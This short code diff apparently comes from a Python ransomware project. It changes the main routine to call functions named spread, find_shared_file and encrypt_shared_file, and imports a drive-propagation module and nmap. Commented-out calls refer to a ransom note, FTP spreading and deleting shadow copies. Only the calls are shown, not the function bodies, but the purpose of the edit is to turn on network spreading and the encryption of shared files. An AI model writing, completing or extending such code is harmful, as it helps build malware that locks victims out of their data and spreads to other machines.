@@ -3,7 +3,7 @@ import getpass
 import os
 import subprocess
 import time
-import drive_propagation
+from drive_propagation import *
 
 import sys
 import nmap
@@ -205,10 +205,12 @@ def main():
     time.sleep(5)
     # find_file()
     # encrypt_file()
-
     message()
     # ransom_note()
     # show_ransom_note()
+    spread()
+    find_shared_file()
+    encrypt_shared_file()
     time.sleep(5)
     # ftp_spread()
     # dlt_shadow_copy()
